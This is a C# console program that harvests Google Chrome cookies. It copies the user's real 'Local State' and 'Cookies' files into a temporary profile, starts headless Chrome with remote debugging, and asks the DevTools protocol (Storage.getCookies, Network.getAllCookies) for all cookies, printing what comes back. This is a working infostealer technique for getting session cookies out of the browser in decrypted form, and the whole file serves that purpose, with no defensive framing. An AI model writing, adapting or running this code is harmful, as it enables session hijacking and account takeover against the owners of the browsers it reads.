using System;
using System.Diagnostics;
using System.IO;

public static class Probe
{
    static string Find(string exe, string rel)
    {
        string[] roots = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        };
        foreach (string r in roots)
        {
            if (string.IsNullOrEmpty(r)) continue;
            string p = Path.Combine(Path.Combine(r, rel.Split('\\')[0]),
                                    string.Join("\\", rel.Split('\\'), 1, rel.Split('\\').Length - 1));
            Console.WriteLine("  try: {0} -> exists={1}", p, File.Exists(p));
            if (File.Exists(p)) return p;
        }
        return null;
    }

    static void Main()
    {
        string exe = Find("chrome.exe", @"Google\Chrome\Application\chrome.exe");
        Console.WriteLine("exe resolved: {0}", exe ?? "NONE");
        if (exe == null) return;

        string temp = Path.Combine(Path.GetTempPath(), "sh_probe_" + Guid.NewGuid().ToString("N").Substring(0, 8));
        string ud = Path.Combine(temp, "ud");
        Directory.CreateDirectory(ud);
        string realUd = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Google\Chrome\User Data");
        try
        {
            File.Copy(Path.Combine(realUd, "Local State"), Path.Combine(ud, "Local State"), true);
            Console.WriteLine("local state copied");
        }
        catch (Exception ce) { Console.WriteLine("local state copy failed: {0}", ce.Message); }
        Directory.CreateDirectory(Path.Combine(ud, "Default", "Network"));
        try
        {
            File.Copy(Path.Combine(realUd, "Default", "Network", "Cookies"),
                      Path.Combine(ud, "Default", "Network", "Cookies"), true);
            Console.WriteLine("cookies copied");
        }
        catch (Exception ce) { Console.WriteLine("cookies copy failed (continuing): {0}", ce.Message); }

        ProcessStartInfo psi = new ProcessStartInfo(exe,
            "--headless=new --remote-debugging-port=0 --user-data-dir=\"" + ud + "\" " +
            "--no-first-run --no-default-browser-check --disable-gpu --disable-extensions about:blank");
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardError = true;
        psi.RedirectStandardOutput = true;
        Process p = Process.Start(psi);
        Console.WriteLine("spawned pid={0}", p.Id);

        string all = "";
        object box = new object();
        System.Threading.ParameterizedThreadStart reader = delegate(object sr)
        {
            try
            {
                StreamReader r = (StreamReader)sr;
                string ln;
                while ((ln = r.ReadLine()) != null)
                {
                    lock (box) { all += ln + "\n"; }
                }
            }
            catch { }
        };
        System.Threading.Thread t1 = new System.Threading.Thread(reader);
        t1.IsBackground = true; t1.Start(p.StandardError);
        System.Threading.Thread t2 = new System.Threading.Thread(reader);
        t2.IsBackground = true; t2.Start(p.StandardOutput);

        string ws = null;
        for (int i = 0; i < 100; i++)
        {
            System.Threading.Thread.Sleep(100);
            lock (box)
            {
                int j = all.IndexOf("DevTools listening on ");
                if (j >= 0)
                {
                    int k = all.IndexOf('\n', j);
                    if (k < 0) k = all.Length;
                    ws = all.Substring(j + 22, k - (j + 22)).Trim();
                    break;
                }
            }
            if (p.HasExited) { Console.WriteLine("chrome exited early rc={0}", p.ExitCode); break; }
        }
        Console.WriteLine("wsUrl: {0}", ws ?? "NOT FOUND");
        if (ws == null)
        {
            lock (box) { Console.WriteLine("stream tail: [{0}]", all.Length > 500 ? all.Substring(all.Length - 500) : all); }
            try { p.Kill(); } catch { }
            return;
        }

        var ws2 = new System.Net.WebSockets.ClientWebSocket();
        ws2.ConnectAsync(new Uri(ws), System.Threading.CancellationToken.None).Wait(8000);
        Console.WriteLine("ws state: {0}", ws2.State);
        string[] methods = new string[] { "Storage.getCookies", "Network.getAllCookies" };
        foreach (string meth in methods)
        {
            var wsx = new System.Net.WebSockets.ClientWebSocket();
            wsx.ConnectAsync(new Uri(ws), System.Threading.CancellationToken.None).Wait(8000);
            if (wsx.State != System.Net.WebSockets.WebSocketState.Open) continue;
            byte[] send = System.Text.Encoding.UTF8.GetBytes("{\"id\":1,\"method\":\"" + meth + "\"}");
            wsx.SendAsync(new ArraySegment<byte>(send),
                System.Net.WebSockets.WebSocketMessageType.Text, true,
                System.Threading.CancellationToken.None).Wait(8000);
            using (var ms = new MemoryStream())
            {
                byte[] buf = new byte[256 * 1024];
                bool got = false;
                while (true)
                {
                    var tr = wsx.ReceiveAsync(new ArraySegment<byte>(buf), System.Threading.CancellationToken.None);
                    if (!tr.Wait(30000)) break;
                    var r = tr.Result;
                    if (r.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
                    ms.Write(buf, 0, r.Count);
                    if (r.EndOfMessage) { got = true; break; }
                }
                string head = System.Text.Encoding.UTF8.GetString(ms.ToArray());
                Console.WriteLine("{0}: got={1} {2} bytes: {3}", meth, got, ms.Length,
                    head.Length > 300 ? head.Substring(0, 300) + " ..." : head);
                try { wsx.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "d",
                    System.Threading.CancellationToken.None).Wait(1000); } catch { }
            }
        }
        try { p.Kill(); } catch { }
        try { Directory.Delete(temp, true); } catch { }
    }
}
